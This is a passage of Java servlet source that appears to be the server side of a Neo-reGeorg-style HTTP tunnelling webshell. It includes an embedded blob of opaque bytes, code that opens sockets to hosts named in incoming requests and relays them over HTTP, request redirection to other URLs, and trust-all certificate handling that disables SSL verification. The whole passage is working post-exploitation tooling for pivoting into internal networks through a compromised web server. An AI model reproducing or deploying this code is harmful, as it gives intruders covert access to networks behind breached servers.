                (byte) 0x2A, (byte) 0x95, (byte) 0x4A, (byte) 0xA5, (byte) 0x16, (byte) 0x90, (byte) 0x4A, (byte) 0xA5, (byte) 0x52, (byte) 0x4E, (byte) 0x2F, (byte) 0xAE, (byte) 0xAE, (byte) 0xC8, (byte) 0x7F, (byte) 0xCF,
                (byte) 0xF7, (byte) 0xE8, (byte) 0x85, (byte) 0x31, (byte) 0xDE, (byte) 0xA6, (byte) 0x44, (byte) 0xC6, (byte) 0x5A, (byte) 0xB4, (byte) 0x31, (byte) 0x92, (byte) 0x8B, (byte) 0x31, (byte) 0xB9, (byte) 0x94,
                (byte) 0x60, (byte) 0x55, (byte) 0x61, (byte) 0x54, (byte) 0x89, (byte) 0x73, (byte) 0x16, (byte) 0x6D, (byte) 0x4A, (byte) 0x4B, (byte) 0xD1, (byte) 0x28, (byte) 0x3B, (byte) 0x2C, (byte) 0xF0, (byte) 0xB2,
                (byte) 0x5B, (byte) 0x60, (byte) 0x5E, (byte) 0x66, (byte) 0xE7, (byte) 0xC0, (byte) 0xC3, (byte) 0x00, (byte) 0xB3, (byte) 0xDD, (byte) 0xA2, (byte) 0x71, (byte) 0x8E, (byte) 0x6C, (byte) 0xDF, (byte) 0x83,
                (byte) 0xF2, (byte) 0xCE, (byte) 0x3A, (byte) 0x27, (byte) 0x6C, (byte) 0xED, (byte) 0xF1, (byte) 0x59, (byte) 0x15, (byte) 0x55, (byte) 0x84, (byte) 0x94, (byte) 0x10, (byte) 0xBD, (byte) 0x67, (byte) 0x3F,
                (byte) 0xCF, (byte) 0x1A, (byte) 0x42, (byte) 0x80, (byte) 0xBF, (byte) 0xB9, (byte) 0x51, (byte) 0x3F, (byte) 0x4D, (byte) 0xF0, (byte) 0x21, (byte) 0x98, (byte) 0x48, (byte) 0xA4, (byte) 0xC2, (byte) 0x0C,
                (byte) 0x51, (byte) 0x55, (byte) 0x0F, (byte) 0x58, (byte) 0x38, (byte) 0x87, (byte) 0x20, (byte) 0xA2, (byte) 0x11, (byte) 0xD0, (byte) 0xB9, (byte) 0x69, (byte) 0x54, (byte) 0xC6, (byte) 0xB1, (byte) 0x9B,
                (byte) 0x1E, (byte) 0x3F, (byte) 0x86, (byte) 0x27, (byte) 0x82, (byte) 0xFC, (byte) 0xAC, (byte) 0x29, (byte) 0x28, (byte) 0x95, (byte) 0x4A, (byte) 0xA5, (byte) 0x52, (byte) 0xA9, (byte) 0x54, (byte) 0x6A,
                (byte) 0x01, (byte) 0xA9, (byte) 0x54, (byte) 0x2A, (byte) 0xCA, (byte) 0x1F, (byte) 0xFC, (byte) 0x20, (byte) 0x9A, (byte) 0x0F, (byte) 0x7D, (byte) 0x68, (byte) 0x6A, (byte) 0xC7, (byte) 0x91, (byte) 0x07,
                (byte) 0xEF, (byte) 0xC9, (byte) 0x3A, (byte) 0x47, (byte) 0x9D, (byte) 0x2A, (byte) 0xDC, (byte) 0x34, (byte) 0xA5, (byte) 0x46, (byte) 0x04, (byte) 0x56, (byte) 0xB5, (byte) 0x14, (byte) 0x0F, (byte) 0x18,
                (byte) 0x55, (byte) 0x71, (byte) 0x29, (byte) 0x95, (byte) 0x04, (byte) 0x2F, (byte) 0x05, (byte) 0x83, (byte) 0x8C, (byte) 0x48, (byte) 0x62, (byte) 0x80, (byte) 0x58, (byte) 0x04, (byte) 0x60, (byte) 0x46,
                (byte) 0x49, (byte) 0x2A, (byte) 0x32, (byte) 0xEF, (byte) 0x73, (byte) 0x4F, (byte) 0x4E, (byte) 0x66, (byte) 0x06, (byte) 0x9A, (byte) 0x06, (byte) 0x66, (byte) 0x1C, (byte) 0xC5, (byte) 0xAE, (byte) 0x56,
                (byte) 0xD4, (byte) 0xE4, (byte) 0xD9, (byte) 0xB6, (byte) 0x2D, (byte) 0x6C, (byte) 0xD9, (byte) 0x59, (byte) 0x0B, (byte) 0xCE, (byte) 0x12, (byte) 0xB3, (byte) 0x02, (byte) 0x28, (byte) 0x22, (byte) 0xA6,
                (byte) 0x84, (byte) 0x18, (byte) 0x23, (byte) 0x62, (byte) 0x08, (byte) 0xE4, (byte) 0xBD, (byte) 0xC7, (byte) 0x3C, (byte) 0x4D, (byte) 0x1A, (byte) 0x76, (byte) 0x3B, (byte) 0xF8, (byte) 0xDD, (byte) 0x4E,
                (byte) 0x7D, (byte) 0x8C, (byte) 0x1C, (byte) 0x01, (byte) 0x48, (byte) 0x91, (byte) 0xA8, (byte) 0x24, (byte) 0x8B, (byte) 0x31, (byte) 0x50, (byte) 0x6B, (byte) 0x91, (byte) 0x88, (byte) 0x34, (byte) 0xB5,
                (byte) 0x2D, (byte) 0x82, (byte) 0x08, (byte) 0x47, (byte) 0x55, (byte) 0x78, (byte) 0x55, (byte) 0xF1, (byte) 0x4D, (byte) 0x63, (byte) 0xEE, (byte) 0xA6, (byte) 0x49, (byte) 0xC2, (byte) 0x93, (byte) 0x27,
                (byte) 0xBD, (byte) 0xCF, (byte) 0xC5, (byte) 0x6A, (byte) 0x42, (byte) 0xA5, (byte) 0x52, (byte) 0xA9, (byte) 0x54, (byte) 0x2A, (byte) 0x95, (byte) 0x4A, (byte) 0x2D, (byte) 0x20, (byte) 0x95, (byte) 0xCA,
                (byte) 0x4F, (byte) 0x27, (byte) 0x4F, (byte) 0x9B, (byte) 0x8F, (byte) 0xFC, (byte) 0x48, (byte) 0xEA, (byte) 0x3E, (byte) 0xF2, (byte) 0x23, (byte) 0x4D, (byte) 0x77, (byte) 0x7A, (byte) 0xCA, (byte) 0xCD,
                (byte) 0xC5, (byte) 0x85, (byte) 0xF4, (byte) 0x44, (byte) 0xDC, (byte) 0x89, (byte) 0xA0, (byte) 0x61, (byte) 0xB6, (byte) 0x8E, (byte) 0x48, (byte) 0x9A, (byte) 0x18, (byte) 0xB1, (byte) 0x2F, (byte) 0x1B,
                (byte) 0x00, (byte) 0x6C, (byte) 0x4A, (byte) 0x6A, (byte) 0x45, (byte) 0xC0, (byte) 0x59, (byte) 0x73, (byte) 0x90, (byte) 0x55, (byte) 0x25, (byte) 0x27, (byte) 0x31, (byte) 0x50, (byte) 0xE6, (byte) 0x45,
                (byte) 0x11, (byte) 0x10
        });        // 0x00 create new tunnel
        String host = new String((byte[]) dataMap.get("h"));
        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
        if (port == 0) {
            try {
                port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            } catch (Exception e) {
                port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
            }
        }

        InputStream readFrom;
        Socket sc = null;
        HttpURLConnection conn = null;

        if (needRedirect) {
            // pipe redirect stream and current response body
            conn = redirect(request, dataMap, redirectUrl);
            readFrom = conn.getInputStream();
        } else {
            // pipe socket stream and current response body
            try {
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
                readFrom = sc.getInputStream();
                this.put(clientId, sc.getOutputStream());
                respOutStream.write(marshal(newStatus((byte) 0x00)));
                respOutStream.flush();
                resp.flushBuffer();
            } catch (Exception e) {
//                    System.out.printf("connect error %s\n", e);
//                    e.printStackTrace();
                this.remove(clientId);
                respOutStream.write(marshal(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
        }
        try {
            readSocket(readFrom, respOutStream, !needRedirect);
        } catch (Exception e) {
//                System.out.println("socket error " + e.toString());
//                e.printStackTrace();
        } finally {
            if (sc != null) {
                sc.close();
            }
            if (conn != null) {
                conn.disconnect();
            }
            respOutStream.close();
            this.remove(clientId);
        }
    }

    public void run() {
        try {
            readSocket(gInStream, gOutStream, true);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
    }

    static HashMap collectAddr() {
        HashMap addrs = new HashMap();
        try {
            Enumeration nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = (NetworkInterface) nifs.nextElement();
                Enumeration addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = (InetAddress) addresses.nextElement();
                    String s = addr.getHostAddress();
                    if (s != null) {
                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                        int ifaceIndex = s.indexOf('%');
                        if (ifaceIndex != -1) {
                            s = s.substring(0, ifaceIndex);
                        }
                        addrs.put((Object) s, (Object) Boolean.TRUE);
                    }
                }
            }
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
        return addrs;
    }

    boolean isLocalAddr(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        return addrs.containsKey(ip);
    }

    HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
        String method = request.getMethod();
        URL u = new URL(rUrl);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.setRequestMethod(method);
        try {
            // conn.setConnectTimeout(3000);
            conn.getClass().getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
            // conn.setReadTimeout(0);
            conn.getClass().getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
        } catch (Exception e) {
            // java1.4
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);

        // ignore ssl verify
        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
        if (HttpsURLConnection.class.isInstance(conn)) {
            ((HttpsURLConnection) conn).setHostnameVerifier(this);
            SSLContext sslCtx = SSLContext.getInstance("SSL");
            sslCtx.init(null, new TrustManager[]{this}, null);
            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
        }

        byte[] newBody = marshal(dataMap);
        Enumeration headers = request.getHeaderNames();
        while (headers.hasMoreElements()) {
            String k = (String) headers.nextElement();
            if (k.equals("Content-Length")) {
                conn.setRequestProperty(k, String.valueOf(newBody.length));
                continue;
            } else if (k.equals("Host")) {
                conn.setRequestProperty(k, u.getHost());
                continue;
            } else if (k.equals("Connection")) {
                conn.setRequestProperty(k, "close");
                continue;
            } else if (k.equals("Content-Encoding") || k.equals("Transfer-Encoding")) {
                continue;
            } else {
                conn.setRequestProperty(k, request.getHeader(k));
            }
        }

        OutputStream rout = conn.getOutputStream();
        rout.write(newBody);
        rout.flush();
        rout.close();
        conn.getResponseCode();
        return conn;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
